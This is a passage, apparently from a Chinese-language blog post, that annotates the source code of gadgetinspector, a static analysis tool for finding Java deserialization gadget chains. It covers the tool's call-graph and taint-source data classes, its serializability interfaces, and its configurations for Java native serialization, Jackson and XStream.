targetArgIndex;   <span class="comment">// 被调用者（方法）的参数索引</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GraphCall</span><span class="params">(MethodReference.Handle callerMethod, MethodReference.Handle targetMethod, <span class="keyword">int</span> callerArgIndex, String callerArgPath, <span class="keyword">int</span> targetArgIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.callerMethod = callerMethod;</span><br><span class="line">        <span class="keyword">this</span>.targetMethod = targetMethod;</span><br><span class="line">        <span class="keyword">this</span>.callerArgIndex = callerArgIndex;</span><br><span class="line">        <span class="keyword">this</span>.callerArgPath = callerArgPath;</span><br><span class="line">        <span class="keyword">this</span>.targetArgIndex = targetArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.<span class="function">Handle <span class="title">getCallerMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> callerMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.<span class="function">Handle <span class="title">getTargetMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> targetMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCallerArgIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> callerArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCallerArgPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> callerArgPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTargetArgIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> targetArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;   <span class="comment">// 比较方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        GraphCall graphCall = (GraphCall) o;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (callerArgIndex != graphCall.callerArgIndex) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetArgIndex != graphCall.targetArgIndex) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (callerMethod != <span class="keyword">null</span> ? !callerMethod.equals(graphCall.callerMethod) : graphCall.callerMethod != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetMethod != <span class="keyword">null</span> ? !targetMethod.equals(graphCall.targetMethod) : graphCall.targetMethod != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> callerArgPath != <span class="keyword">null</span> ? callerArgPath.equals(graphCall.callerArgPath) : graphCall.callerArgPath == <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123; <span class="comment">// 存储到键值数据格式中调用的比较方法</span></span><br><span class="line">        <span class="keyword">int</span> result = callerMethod != <span class="keyword">null</span> ? callerMethod.hashCode() : <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">31</span> * result + (targetMethod != <span class="keyword">null</span> ? targetMethod.hashCode() : <span class="number">0</span>);</span><br><span class="line">        result = <span class="number">31</span> * result + callerArgIndex;</span><br><span class="line">        result = <span class="number">31</span> * result + (callerArgPath != <span class="keyword">null</span> ? callerArgPath.hashCode() : <span class="number">0</span>);</span><br><span class="line">        result = <span class="number">31</span> * result + targetArgIndex;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义读写格式：<code>父类，父方法，父方法描述符，子类，被调方法，被调方法描述，父方法参数索引，父方法参数名，被调方法参数索引</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">GraphCall</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> GraphCall <span class="title">parse</span><span class="params">(String[] fields)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> GraphCall(</span><br><span class="line">                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>]),</span><br><span class="line">                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">3</span>]), fields[<span class="number">4</span>], fields[<span class="number">5</span>]),</span><br><span class="line">                Integer.parseInt(fields[<span class="number">6</span>]),</span><br><span class="line">                fields[<span class="number">7</span>],</span><br><span class="line">                Integer.parseInt(fields[<span class="number">8</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(GraphCall obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                obj.callerMethod.getClassReference().getName(), obj.callerMethod.getName(), obj.callerMethod.getDesc(),</span><br><span class="line">                obj.targetMethod.getClassReference().getName(), obj.targetMethod.getName(), obj.targetMethod.getDesc(),</span><br><span class="line">                Integer.toString(obj.callerArgIndex),</span><br><span class="line">                obj.callerArgPath,</span><br><span class="line">                Integer.toString(obj.targetArgIndex),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-Source"><a href="#8-Source" class="headerlink" title="8. Source"></a>8. Source</h3><p>定义<strong>污点源信息</strong>的描述方式，由实现了抽象类 <code>SourceDiscovery</code> 的类搜索和记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Source</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle sourceMethod;  <span class="comment">// 所属方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> taintedArgIndex;                  <span class="comment">// 传递污点的参数索引</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Source</span><span class="params">(MethodReference.Handle sourceMethod, <span class="keyword">int</span> taintedArgIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sourceMethod = sourceMethod;</span><br><span class="line">        <span class="keyword">this</span>.taintedArgIndex = taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.<span class="function">Handle <span class="title">getSourceMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sourceMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTaintedArgIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义<strong>污点源信息</strong>的读写格式：<code>类名 方法名 方法描述符 参数索引</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">Source</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Source <span class="title">parse</span><span class="params">(String[] fields)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Source(</span><br><span class="line">                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>]),</span><br><span class="line">                Integer.parseInt(fields[<span class="number">3</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Source obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                obj.sourceMethod.getClassReference().getName(), obj.sourceMethod.getName(), obj.sourceMethod.getDesc(),</span><br><span class="line">                Integer.toString(obj.taintedArgIndex),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gadgetinspector"><a href="#gadgetinspector" class="headerlink" title="gadgetinspector"></a>gadgetinspector</h2><p>实现检测需要实现的抽象类和接口，其他类的解析放到 <strong>0x03 工作流程</strong> 一节。</p><h3 id="1-SerializableDecider"><a href="#1-SerializableDecider" class="headerlink" title="1. SerializableDecider"></a>1. SerializableDecider</h3><p>序列化决策者接口，判断类是否可序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Represents logic to decide if a class is serializable. The simple case (implemented by</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> SimpleSerializableDecider&#125;) just checks if the class implements serializable. Other use-cases may have more</span></span><br><span class="line"><span class="comment"> * complicated logic.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SerializableDecider</span> <span class="keyword">extends</span> <span class="title">Function</span>&lt;<span class="title">ClassReference</span>.<span class="title">Handle</span>, <span class="title">Boolean</span>&gt; </span>&#123; <span class="comment">// 序列化决策者</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ImplementationFinder"><a href="#2-ImplementationFinder" class="headerlink" title="2. ImplementationFinder"></a>2. ImplementationFinder</h3><p>接口，用于查找可序列化的重写方法，即判断方法所属类是否可序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ImplementationFinder</span> </span>&#123;</span><br><span class="line">    Set&lt;MethodReference.Handle&gt; getImplementations(MethodReference.Handle target); <span class="comment">// 查找可序列化的重写方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-SourceDiscovery"><a href="#3-SourceDiscovery" class="headerlink" title="3. SourceDiscovery"></a>3. SourceDiscovery</h3><p>抽象类，实现了污点源信息的存储方法，子类需要实现污点源的具体查找方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceDiscovery</span> </span>&#123; <span class="comment">// 抽象类</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存找到的污点源</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Source&gt; discoveredSources = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加污点源</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> source 污点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">addDiscoveredSource</span><span class="params">(Source source)</span> </span>&#123;</span><br><span class="line">        discoveredSources.add(source);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查找污点源</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 加载类信息</span></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">        <span class="comment">// 加载函数信息</span></span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        <span class="comment">// 加载继承信息</span></span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用实现类的 discover 方法</span></span><br><span class="line">        discover(classMap, methodMap, inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 抽象方法 -&gt; 具体实现</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap       类信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodMap      方法信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap 继承信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  InheritanceMap inheritanceMap)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用工厂方法存储污点源信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> Source.Factory(), discoveredSources);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gadgetinspector-config"><a href="#gadgetinspector-config" class="headerlink" title="gadgetinspector/config"></a>gadgetinspector/config</h2><p>定义配置。</p><h3 id="1-GIConfig"><a href="#1-GIConfig" class="headerlink" title="1. GIConfig"></a>1. GIConfig</h3><p>配置接口，所有检测实现都必须实现该接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">GIConfig</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 配置名称</span></span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化决策者</span></span><br><span class="line">    <span class="function">SerializableDecider <span class="title">getSerializableDecider</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找可序列化的重写方法</span></span><br><span class="line">    <span class="function">ImplementationFinder <span class="title">getImplementationFinder</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 InheritanceMap inheritanceMap)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找污点源</span></span><br><span class="line">    <span class="function">SourceDiscovery <span class="title">getSourceDiscovery</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ConfigRepository"><a href="#2-ConfigRepository" class="headerlink" title="2. ConfigRepository"></a>2. ConfigRepository</h3><p>定义配置列表，用于返回配置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigRepository</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 配置列表</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;GIConfig&gt; ALL_CONFIGS = Collections.unmodifiableList(Arrays.asList(</span><br><span class="line">            <span class="keyword">new</span> JavaDeserializationConfig(),        <span class="comment">// Java 原生序列化</span></span><br><span class="line">            <span class="keyword">new</span> JacksonDeserializationConfig(),     <span class="comment">// Jackson（Json）</span></span><br><span class="line">            <span class="keyword">new</span> XstreamDeserializationConfig()));   <span class="comment">// XStream（XML）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回配置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name 配置名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> GIConfig <span class="title">getConfig</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (GIConfig config : ALL_CONFIGS) &#123;</span><br><span class="line">            <span class="keyword">if</span> (config.getName().equals(name)) &#123;</span><br><span class="line">                <span class="keyword">return</span> config;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-GIConfig-接口实现"><a href="#3-GIConfig-接口实现" class="headerlink" title="3. GIConfig 接口实现"></a>3. GIConfig 接口实现</h3><p>JavaDeserializationConfig</p><ul><li>配置名称：<code>jserial</code></li><li>序列化决策者：gadgetinspector/javaserial/SimpleSerializableDecider</li><li>查找可序列化的重写方法：gadgetinspector/javaserial/SimpleImplementationFinder</li><li>查找污点源：gadgetinspector/javaserial/SimpleSourceDiscovery</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDeserializationConfig</span> <span class="keyword">implements</span> <span class="title">GIConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;jserial&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SerializableDecider <span class="title">getSerializableDecider</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SimpleSerializableDecider(inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ImplementationFinder <span class="title">getImplementationFinder</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SimpleImplementationFinder(getSerializableDecider(methodMap, inheritanceMap), methodImplMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SourceDiscovery <span class="title">getSourceDiscovery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SimpleSourceDiscovery();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JacksonDeserializationConfig</p><ul><li>配置名称：<code>jackson</code></li><li>序列化决策者：gadgetinspector/jackson/JacksonSerializableDecider</li><li>查找可序列化的重写方法：gadgetinspector/jackson/JacksonImplementationFinder</li><li>查找污点源：gadgetinspector/jackson/JacksonSourceDiscovery</li></ul><p>XstreamDeserializationConfig</p><ul><li>配置名称：<code>xstream</code></li><li>序列化决策者：gadgetinspector/xstream/XstreamSerializableDecider、gadgetinspector/xstream/CustomXstreamSerializableDecider</li><li>查找可序列化的重写方法：gadgetinspector/javaserial/SimpleImplementationFinder</li><li>查找污点源：gadgetinspector/javaserial/SimpleSourceDiscovery</li></ul><h2 id="gadgetinspector-javaserial"><a href="#gadgetinspector-javaserial" class="headerlink" title="gadgetinspector/javaserial"></a>gadgetinspector/javaserial</h2><p>针对 Java 原生序列化的反序列化利用链检测实现。</p><h3 id="1-SimpleSerializableDecider"><a href="#1-SimpleSerializableDecider" class="headerlink" title="1. SimpleSerializableDecider"></a>1. SimpleSerializableDecider</h3><p>实现 <code>SerializableDecider</code> 接口，判断类是否可序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleSerializableDecider</span> <span class="keyword">implements</span> <span class="title">SerializableDecider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Boolean&gt; cache = <span class="keyword">new</span> HashMap&lt;&gt;();  <span class="comment">// 缓存判断结果，类-&gt;是否可序列化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;    <span class="comment">// 继承信息</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SimpleSerializableDecider</span><span class="params">(InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断类是否可以序列化，并将判断结果添加到缓存</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handle 类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">apply</span><span class="params">(ClassReference.Handle handle)</span> </span>&#123;</span><br><span class="line">        Boolean cached = cache.get(handle);</span><br><span class="line">        <span class="keyword">if</span> (cached != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> 